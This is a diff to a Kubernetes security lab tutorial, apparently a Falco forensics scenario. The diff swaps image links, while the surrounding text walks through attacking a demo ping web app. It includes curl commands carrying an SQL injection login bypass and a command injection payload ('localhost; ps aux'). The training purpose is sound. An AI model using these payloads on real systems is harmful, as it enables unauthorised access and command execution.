@@ -95,11 +95,11 @@ Alternatively, you can open this URL in your browser:
 
 You can use the username "bob" and password "foobar" to ping any machine in the Internet.
 
-![Ping](/sysdig/courses/falco/forensics-k8s/assets/01_pingweb.png)
+![Ping](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/01_pingweb.png)
 
 If you enter an incorrect password, access will be denied.
 
-![Wrong password](/sysdig/courses/falco/forensics-k8s/assets/02_wrong_password.png)
+![Wrong password](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/02_wrong_password.png)
 
 Now we will do the same, but from the `client` pod.  Let's send a request to the Ping application to ping localhost:
 
@@ -125,7 +125,7 @@ SQL Injection attack
 
 It turns out our web application is faulty and susceptible to [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) attacks:
 
-![SQL injection](/sysdig/courses/falco/forensics-k8s/assets/03_sql_injection.png)
+![SQL injection](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/03_sql_injection.png)
 
 `kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost" -X POST http://ping/ping.php`{{execute}}
 
@@ -133,7 +133,7 @@ An attacker can bypass the authentication mechanism and use the application with
 
 Not only that, he can even **execute arbitrary commands**:
 
-![Arbitrary command](/sysdig/courses/falco/forensics-k8s/assets/04_arbitrary_command.png)
+![Arbitrary command](https://github.com/jchowdhary/sysdig-scenarios/blob/master/falco/forensics-k8s/assets/04_arbitrary_command.png)
 
 `kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ps aux" -X POST http://ping/ping.php`{{execute}}
 
